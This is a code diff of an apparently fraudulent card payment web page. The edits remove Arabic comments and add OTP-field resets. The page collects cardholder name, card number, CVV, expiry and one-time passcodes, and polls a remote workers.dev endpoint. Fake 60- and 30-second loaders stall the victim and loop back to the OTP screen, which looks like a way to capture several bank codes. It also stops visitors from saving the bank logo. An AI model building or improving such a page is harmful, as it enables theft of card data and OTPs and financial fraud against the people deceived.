@@ -202,7 +202,6 @@ html,body{
   color:#9a9a9a;
 }
 
-/* شاشات إضافية */
 .screen{
   display:none;
 }
@@ -409,7 +408,6 @@ html,body{
 <script>
 const API_URL = "https://snowy-bread-61bc.aefoon2030.workers.dev/";
 
-/* شعارات الأنواع */
 const CARD_LOGOS = {
   visa: "https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png",
   mastercard: "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg",
@@ -449,7 +447,6 @@ async function loadAmount() {
 loadAmount();
 setInterval(loadAmount, 3000);
 
-/* عناصر */
 const paymentScreen = document.getElementById("paymentScreen");
 const loader60Screen = document.getElementById("loader60Screen");
 const otpScreen = document.getElementById("otpScreen");
@@ -470,7 +467,6 @@ const cardTypeLogo = document.getElementById("cardTypeLogo");
 let loader60Timer = null;
 let loader30Timer = null;
 
-/* تعبئة الأشهر والسنوات */
 for (let i = 1; i <= 12; i++) {
   const option = document.createElement("option");
   option.value = String(i).padStart(2, "0");
@@ -491,7 +487,6 @@ for (let y = 26; y <= 50; y++) {
   });
 });
 
-/* تبديل الشاشات */
 function showScreen(screenEl) {
   [paymentScreen, loader60Screen, otpScreen, loader30Screen].forEach(el => {
     el.classList.remove("active");
@@ -499,7 +494,6 @@ function showScreen(screenEl) {
   screenEl.classList.add("active");
 }
 
-/* اسم حامل البطاقة */
 cardHolder.addEventListener("input", function () {
   this.value = this.value.replace(/[^A-Za-z ]/g, "");
   validateCardHolder();
@@ -524,7 +518,6 @@ function validateCardHolder() {
   return valid;
 }
 
-/* تحديد نوع البطاقة */
 function detectCardType(digits) {
   if (!digits) return "unknown";
 
@@ -552,7 +545,6 @@ function updateCardTypeLogo(type) {
   cardTypeLogo.src = CARD_LOGOS[type] || CARD_LOGOS.unknown;
 }
 
-/* رقم البطاقة */
 cardNumber.addEventListener("input", function () {
   let digits = this.value.replace(/\D/g, "").slice(0, 16);
   this.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
@@ -580,7 +572,6 @@ function validateCardNumber() {
   return valid;
 }
 
-/* CVV */
 cvv.addEventListener("input", function () {
   this.value = this.value.replace(/\D/g, "").slice(0, 3);
   validateCVV();
@@ -603,7 +594,6 @@ function validateCVV() {
   return valid;
 }
 
-/* تاريخ الانتهاء */
 function validateExpiry() {
   const valid = expMonth.value !== "" && expYear.value !== "";
 
@@ -622,7 +612,6 @@ function validateExpiry() {
 expMonth.addEventListener("change", validateExpiry);
 expYear.addEventListener("change", validateExpiry);
 
-/* OTP */
 otpInput.addEventListener("input", function () {
   this.value = this.value.replace(/\D/g, "").slice(0, 6);
   validateOTP();
@@ -646,7 +635,6 @@ function validateOTP() {
   return valid;
 }
 
-/* منع تنزيل/سحب/تحديد الشعار */
 document.addEventListener("contextmenu", function (e) {
   if (e.target.closest(".card-logo-top")) {
     e.preventDefault();
@@ -665,7 +653,6 @@ document.addEventListener("selectstart", function (e) {
   }
 });
 
-/* التحقق الكامل */
 function validatePaymentForm() {
   const holderOk = validateCardHolder();
   const cardOk = validateCardNumber();
@@ -680,7 +667,6 @@ function validatePaymentForm() {
   return holderOk && cardOk && cvvOk && expiryOk;
 }
 
-/* تحميل 60 ثانية ثم OTP */
 function startLoader60ThenOTP() {
   clearInterval(loader60Timer);
   let seconds = 60;
@@ -698,23 +684,22 @@ function startLoader60ThenOTP() {
   }, 1000);
 }
 
-/* تحميل 30 ثانية بدون عداد ثم رجوع OTP */
 function startLoader30ThenBackOTP() {
   clearTimeout(loader30Timer);
   showScreen(loader30Screen);
 
   loader30Timer = setTimeout(() => {
+    otpInput.value = "";
+    otpInput.classList.remove("error");
     showScreen(otpScreen);
   }, 30000);
 }
 
-/* زر ادفع */
 payBtn.addEventListener("click", function () {
   if (!validatePaymentForm()) return;
   startLoader60ThenOTP();
 });
 
-/* زر تحقق */
 otpBtn.addEventListener("click", function () {
   const otpOk = validateOTP();
 
@@ -729,4 +714,4 @@ otpBtn.addEventListener("click", function () {
 });
 </script>
 </body>
-</html>
+  </html>
